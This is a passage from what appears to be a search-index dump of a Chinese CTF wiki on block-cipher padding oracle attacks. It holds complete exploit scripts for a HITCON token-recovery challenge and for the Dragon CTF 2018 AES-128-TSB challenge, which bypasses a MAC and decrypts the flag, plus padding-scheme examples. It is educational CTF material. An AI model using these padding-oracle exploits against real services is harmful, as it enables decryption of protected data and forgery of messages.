\uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a md5(token[:i]) \u7684 \u6700\u540e\u4e00\u4e2a\u5b57\u8282 \u3002\u7136\u800c\uff0c\u5982\u679c md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684 token[:i] \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002 \u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work\u3002 \u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c token_enc \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282 \"token: \" \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002 \u4f9d\u6b21\u83b7\u53d6 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002 \u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587 token_enc|padding|IV_indexi|welcome_enc \u3002\u7531\u4e8e IV_indexi \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56>340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002 \u518d\u6b21\u6784\u9020\u5bc6\u6587 token_enc|padding|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002 \u5728\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002 \u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a md5(token[:i]) \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002 \u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d sleep \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # remove pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) def sendmsg ( iv , cipher ): payload = iv + cipher payload = base64 . b64encode ( payload ) p . sendline ( payload ) def recvmsg (): data = p . recvuntil ( \" \\n \" , drop = True ) data = base64 . b64decode ( data ) return data [: 16 ], data [ 16 :] def getmd5enc ( i , cipher_token , cipher_welcome , iv ): \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\" ## keep iv[7:] do not change, so decrypt msg[7:] won't change get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv ) payload = cipher_token ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_token ) + 16 + 16 - ( 7 + i + 1 )), iv ) payload += last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , payload ) return recvmsg () def get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ): md5_token_idxi = [] for i in range ( len ( cipher_token ) - 7 ): log . info ( \"idx i: {} \" . format ( i )) _ , md5_indexi = getmd5enc ( i , cipher_token , cipher_welcome , iv_encrypt ) assert ( len ( md5_indexi ) == 32 ) # remove the last 16 byte for padding md5_token_idxi . append ( md5_indexi [: 16 ]) return md5_token_idxi def doin ( unpadcipher , md5map , candidates , flag ): if unpadcipher in md5map : lastbyte = md5map [ unpadcipher ] else : lastbyte = 0 if flag == 0 : lastbyte ^= 0x80 newcandidates = [] for x in candidates : for c in range ( 256 ): if MD5 . new ( x + chr ( c )) . digest ()[ - 1 ] == chr ( lastbyte ): newcandidates . append ( x + chr ( c )) candidates = newcandidates print candidates return candidates def main (): bypassproof () # result of encrypted Welcome!! iv_encrypt , cipher_welcome = recvmsg () log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-token get_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-token\" ), iv_encrypt ) sendmsg ( get_token_iv , cipher_welcome ) _ , cipher_token = recvmsg () token_len = len ( cipher_token ) log . info ( \"cipher token is : \" + cipher_token ) # get command not found cipher sendmsg ( iv_encrypt , cipher_welcome ) _ , cipher_notfound = recvmsg () # get encrypted(token[:i+1]),57 times md5_token_idx_list = get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ) # get md5map for each unpadsize, 209-17 times # when upadsize>208, it will unpad ciphertoken # then we can reuse md5map = dict () for unpadsize in range ( 17 , 209 ): log . info ( \"get unpad size {} cipher\" . format ( unpadsize )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" ## calculate the proper last byte number, only change the last byte ## set last_byte_iv = iv_encrypted[:15] | proper byte last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"Welcome!!\" )[: 15 ] + chr ( unpadsize ), iv_encrypt ) cipher = cipher_token + padding + last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () md5map [ unpadcipher ] = unpadsize # reuse encrypted(token[:i+1]) for i in range ( 209 , 256 ): target = md5_token_idx_list [ 56 - ( i - 209 )] md5map [ target ] = i candidates = [ \"\" ] # get the byte token[i], only 56 byte for i in range ( token_len - 7 ): log . info ( \"get token[ {} ]\" . format ( i )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list [ i ] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () # already in or md5[token[:i]][-1]='\\x00' if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 1 ) else : log . info ( \"unpad size 1-16\" ) # flip most significant bit of last byte to move it in a good range cipher = cipher [: - 17 ] + strxor ( cipher [ - 17 ], ' \\x80 ' ) + cipher [ - 16 :] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 0 ) else : log . info ( 'oh my god,,,, it must be in...' ) exit () print len ( candidates ) # padding 0x01 candidates = filter ( lambda x : x [ - 1 ] == chr ( 0x01 ), candidates ) # only 56 bytes candidates = [ x [: - 1 ] for x in candidates ] print len ( candidates ) assert ( len ( candidates [ 0 ]) == 56 ) # check-token check_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"check-token\" ), iv_encrypt ) sendmsg ( check_token_iv , cipher_welcome ) p . recvuntil ( \"Give me the token! \\n \" ) p . sendline ( base64 . b64encode ( candidates [ 0 ])) print p . recv () p . interactive () if __name__ == \"__main__\" : main () \u6548\u679c\u5982\u4e0b ... 79 1 hitcon { uNp@d_M3th0D_i5_am4Z1n9! }","title":"\u5229\u7528\u601d\u8def"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#teaser-dragon-ctf-2018-aes-128-tsb","text":"\u8fd9\u4e2a\u9898\u76ee\u8fd8\u662f\u86ee\u6709\u610f\u601d\u7684\uff0c\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Haven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is! Server: aes-128-tsb.hackable.software 1337 server.py \u9644\u4ef6\u4ee5\u53ca\u6700\u540e\u7684 exp \u81ea\u884c\u5230 ctf-challenge \u4ed3\u5e93\u4e0b\u5bfb\u627e\u3002 \u9898\u76ee\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a \u4e0d\u65ad\u63a5\u6536 a \u548c b \u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d a \u4e3a\u660e\u6587\uff0cb \u4e3a\u5bc6\u6587\uff0c\u6ce8\u610f b \u5728\u89e3\u5bc6\u540e\u9700\u8981\u6ee1\u8db3\u5c3e\u90e8\u6070\u597d\u7b49\u4e8e iv\u3002 \u5982\u679c a \u548c b \u76f8\u7b49\uff0c\u90a3\u4e48\u6839\u636e a \u4e3a gimme_flag \uff0c\u8f93\u51fa\u52a0\u5bc6\u540e\u7684 flag\u3002 \u5426\u5219\uff0c\u8f93\u51fa\u4e00\u4e32\u968f\u673a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u3002 \u5426\u5219\u8f93\u51fa\u4e00\u4e32\u660e\u6587\u7684\u5b57\u7b26\u4e32\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u9898\u76ee\u4e2d\u7684 unpad \u5b58\u5728\u95ee\u9898\uff0c\u53ef\u4ee5\u622a\u65ad\u6307\u5b9a\u957f\u5ea6\u3002 def unpad ( msg ): if not msg : return '' return msg [: - ord ( msg [ - 1 ])] \u4e00\u5f00\u59cb\uff0c\u5f88\u76f4\u63a5\u7684\u601d\u8def\u662f a \u548c b \u7684\u957f\u5ea6\u90fd\u8f93\u5165 0 \uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u7ed5\u8fc7 a==b \u68c0\u67e5\uff0c\u83b7\u53d6\u4e00\u4e32\u968f\u673a\u5bc6\u6587\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u3002\u7136\u800c\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u52a0\u5bc6\u7684\u6d41\u7a0b def tsb_encrypt ( aes , msg ): msg = pad ( msg ) iv = get_random_bytes ( 16 ) prev_pt = iv prev_ct = iv ct = '' for block in split_by ( msg , 16 ) + [ iv ]: ct_block = xor ( block , prev_pt ) ct_block = aes . encrypt ( ct_block ) ct_block = xor ( ct_block , prev_ct ) ct += ct_block prev_pt = block prev_ct = ct_block return iv + ct \u4e0d\u59a8\u5047\u8bbe P_0=iv,C_0=iv P_0=iv,C_0=iv \uff0c\u5219 C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) \u90a3\u4e48\uff0c\u5047\u8bbe\u6d88\u606f\u957f\u5ea6\u4e3a 16\uff0c\u4e0e\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684 gimme_flag padding \u540e\u957f\u5ea6\u7c7b\u4f3c\uff0c\u5219 C_1=IV\\oplus E( IV \\oplus P_1) C_1=IV\\oplus E( IV \\oplus P_1) C_2=C_1 \\oplus E(P_1 \\oplus IV) C_2=C_1 \\oplus E(P_1 \\oplus IV) \u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u53d1\u73b0 C_2=IV C_2=IV \u3002 \uff08 \u76d7\u56fe \uff0c\u4e0b\u9762\u7684\u56fe\u7247\u66f4\u52a0\u6e05\u6670 \u53cd\u8fc7\u6765\u60f3\uff0c\u5982\u679c\u6211\u4eec\u5411\u670d\u52a1\u5668\u53d1\u9001 iv+c+iv \uff0c\u90a3\u4e48\u603b\u80fd\u7ed5\u8fc7 tsb_decrypt \u7684 mac \u68c0\u67e5 def tsb_decrypt ( aes , msg ): iv , msg = msg [: 16 ], msg [ 16 :] prev_pt = iv prev_ct = iv pt = '' for block in split_by ( msg , 16 ): pt_block = xor ( block , prev_ct ) pt_block = aes . decrypt ( pt_block ) pt_block = xor ( pt_block , prev_pt ) pt += pt_block prev_pt = pt_block prev_ct = block pt , mac = pt [: - 16 ], pt [ - 16 :] if mac != iv : raise CryptoError () return unpad ( pt ) \u90a3\u4e48\u6b64\u65f6\uff0c\u670d\u52a1\u5668\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u5219\u662f unpad(IV \\oplus D(C_1 \\oplus IV)) unpad(IV \\oplus D(C_1 \\oplus IV))","title":"Teaser Dragon CTF 2018 AES-128-TSB"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_10","text":"\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u63a7\u5236 D \u89e3\u5bc6\u7684\u6d88\u606f\u4e3a\u5e38\u6570\u503c\uff0c\u6bd4\u5982\u5168\u96f6\uff0c\u5373 C1=IV \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece 0 \u5230 255 \u679a\u4e3e IV \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u5f97\u5230 IV \\oplus D(C_1 \\oplus IV) IV \\oplus D(C_1 \\oplus IV) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e5f\u662f 0~255\u3002\u800c\u53ea\u6709\u662f 1~15 \u7684\u65f6\u5019\uff0c unpad \u64cd\u4f5c\u8fc7\u540e\uff0c\u6d88\u606f\u957f\u5ea6\u4e0d\u4e3a 0\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u679a\u4e3e\u65f6\u7edf\u8ba1\u7a76\u7adf\u54ea\u4e9b\u6570\u5b57\u5bfc\u81f4\u4e86\u957f\u5ea6\u4e0d\u4e3a\u96f6\uff0c\u5e76\u6807\u8bb0\u4e3a 1\uff0c\u5176\u4f59\u6807\u8bb0\u4e3a 0\u3002 def getlast_byte ( iv , block ): iv_pre = iv [: 15 ] iv_last = ord ( iv [ - 1 ]) tmp = [] print ( 'get last byte' ) for i in range ( 256 ): send_data ( '' ) iv = iv_pre + chr ( i ) tmpblock = block [: 15 ] + chr ( i ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' in data : tmp . append ( 1 ) else : tmp . append ( 0 ) last_bytes = [] for i in range ( 256 ): if tmp == xor_byte_map [ i ][ 0 ]: last_bytes . append ( xor_byte_map [ i ][ 1 ]) print ( 'possible last byte is ' + str ( last_bytes )) return last_bytes \u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6700\u521d\u7684\u65f6\u5019\u6253\u8868\u83b7\u53d6\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6240\u6709\u7684\u53ef\u80fd\u60c5\u51b5\uff0c\u8bb0\u5f55\u5728 xor_byte_map \u4e2d\u3002 \"\"\" every item is a pair [a,b] a is the xor list b is the idx which is zero when xored \"\"\" xor_byte_map = [] for i in range ( 256 ): a = [] b = 0 for j in range ( 256 ): tmp = i ^ j if tmp > 0 and tmp <= 15 : a . append ( 1 ) else : a . append ( 0 ) if tmp == 0 : b = j xor_byte_map . append ([ a , b ]) \u901a\u8fc7\u4e0e\u8fd9\u4e2a\u8868\u8fdb\u884c\u5bf9\u6bd4\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u53ef\u80fd\u7684\u60c5\u51b5\u3002","title":"\u83b7\u53d6\u660e\u6587\u6700\u540e\u4e00\u4e2a\u5b57\u8282"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_11","text":"\u5728\u83b7\u53d6\u4e86\u660e\u6587\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528 unpad \u7684\u6f0f\u6d1e\uff0c\u4ece\u957f\u5ea6 1 \u679a\u4e3e\u5230\u957f\u5ea6 15 \u6765\u83b7\u5f97\u5bf9\u5e94\u7684\u660e\u6587\u5185\u5bb9\u3002 def dec_block ( iv , block ): last_bytes = getlast_byte ( iv , block ) iv_pre = iv [: 15 ] iv_last = ord ( iv [ - 1 ]) print ( 'try to get plain' ) plain0 = '' for last_byte in last_bytes : plain0 = '' for i in range ( 15 ): print 'idx:' , i tag = False for j in range ( 256 ): send_data ( plain0 + chr ( j )) pad_size = 15 - i iv = iv_pre + chr ( pad_size ^ last_byte ) tmpblock = block [: 15 ] + chr ( pad_size ^ last_byte ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' not in data : # success plain0 += chr ( j ) tag = True break if not tag : break # means the last byte is ok if plain0 != '' : break plain0 += chr ( iv_last ^ last_byte ) return plain0","title":"\u89e3\u5bc6\u4efb\u610f\u52a0\u5bc6\u5757"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_12","text":"\u8fd9\u4e00\u70b9\u6bd4\u8f83\u7b80\u5355\uff0c\u6211\u4eec\u5e0c\u671b\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u83b7\u53d6 gimme_flag \u7684\u5bc6\u6587 print ( 'get the cipher of flag' ) gemmi_iv1 = xor ( pad ( 'gimme_flag' ), plain0 ) gemmi_c1 = xor ( gemmi_iv1 , cipher0 ) payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1 send_data ( 'gimme_flag' ) send_data ( payload ) flag_len , flag_cipher = recv_data () \u5176\u4e2d plain0 \u548c cipher0 \u662f\u6211\u4eec\u83b7\u53d6\u7684 AES \u52a0\u5bc6\u7684\u660e\u5bc6\u6587\u5bf9\uff0c\u4e0d\u5305\u62ec\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u4e24\u4e2a\u5f02\u6216\u3002","title":"\u89e3\u5bc6\u51fa\u6307\u5b9a\u660e\u6587"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#flag","text":"\u8fd9\u4e00\u70b9\uff0c\u5176\u5b9e\u5c31\u662f\u5229\u7528\u89e3\u5bc6\u4efb\u610f\u52a0\u5bc6\u5757\u7684\u529f\u80fd\u5b9e\u73b0\u7684\uff0c\u5982\u4e0b print ( 'the flag cipher is ' + flag_cipher . encode ( 'hex' )) flag_cipher = split_by ( flag_cipher , 16 ) print ( 'decrypt the blocks one by one' ) plain = '' for i in range ( len ( flag_cipher ) - 1 ): print ( 'block: ' + str ( i )) if i == 0 : plain += dec_block ( flag_cipher [ i ], flag_cipher [ i + 1 ]) else : iv = plain [ - 16 :] cipher = xor ( xor ( iv , flag_cipher [ i + 1 ]), flag_cipher [ i ]) plain += dec_block ( iv , cipher ) pass print ( 'now plain: ' + plain ) print plain \u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u7b2c\u4e8c\u5757\u4e4b\u540e\u7684\u5bc6\u6587\u64cd\u4f5c\u4f1a\u6709\u6240\u4e0d\u540c\u3002 \u5b8c\u6574\u7684\u4ee3\u7801\u53c2\u8003 ctf-challenge \u4ed3\u5e93\u3002","title":"\u89e3\u5bc6 flag"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_13","text":"\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f https://en.wikipedia.org/wiki/Padding_oracle_attack http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf https://ctftime.org/writeup/7975 https://ctftime.org/writeup/7974","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/blockcipher/mode/padding/","text":"\u586b\u5145\u65b9\u5f0f \u00b6 \u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002 \u5e38\u89c1\u7684 \u586b\u5145\u89c4\u5219 \u5982\u4e0b\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002 Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding) \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 05 05 05 05 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40 Pad with 0x80 followed by zero bytes (OneAndZeroes Padding) \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 80 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 \u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002 Pad with zeroes except make the last byte equal to the number of padding bytes \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8 Pad with zero (null) characters \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75 Pad with spaces \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 20 20 20 20 20 KEY = 01 23 45 67 89 AB CD EF DES 